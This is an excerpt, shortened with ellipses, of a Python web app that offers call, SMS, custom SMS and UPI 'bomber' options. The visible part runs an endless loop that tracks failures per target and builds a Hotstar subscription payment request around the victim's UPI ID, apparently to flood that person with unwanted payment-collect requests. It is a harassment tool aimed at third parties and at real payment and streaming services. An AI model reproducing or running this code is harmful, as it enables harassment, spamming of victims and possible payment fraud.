...
def MyApp():
    ...
    mm = input.input_group('This Are Our Collection', [
        input.radio('Choose What You Want:', options=['Call Bomber', 'Sms Bomber', 'Custom Sms Bomber', 'Upi Bomber'], name='meth')
    ])
    ...
    if method == 'Call Bomber':
        ...
        while True:
            ...
            if KK not in count:
            	...
            	count[KK]["failed"] = 0
            xx = {"paymentMode":"UPI","pgName":"razorUPI","paymentProcessor":"razorS2SCollect","subscriptionPack":"HotstarSuper.IN.3Month.299","returnUrl":"https://www.hotstar.com/in/payment/status?action=SUBSCRIPTION_JOURNEY_ENDED&family=HotstarSuper&isOnboarding=true&is_paywall_onboarding=true&packId=HotstarSuper.IN.3Month.299&pack_id=HotstarSuper.IN.3Month.299&prevpageurl=%2Fin%2Fsettings&transaction_id=%7B%7BtransactionId%7D%7D","abTags":["PayX","PayXWeb","V2_FLOW"],"bankCode":"","cardBIN":"","fname":"","lname":"","latitude":"","longitude":"","payload":{"vpa": KK,"paymentHash":"","pgParams":{"versionCode":"-1","redirectURL":"https://www.hotstar.com/in/payment/status?action=SUBSCRIPTION_JOURNEY_ENDED&family=HotstarSuper&isOnboarding=true&is_paywall_onboarding=true&packId=HotstarSuper.IN.3Month.299&pack_id=HotstarSuper.IN.3Month.299&prevpageurl=/in/settings&transaction_id={{transactionId}}","mobileNumber":"9191919191"},"phoneNumber":"","referralCode":""}}
            while True:
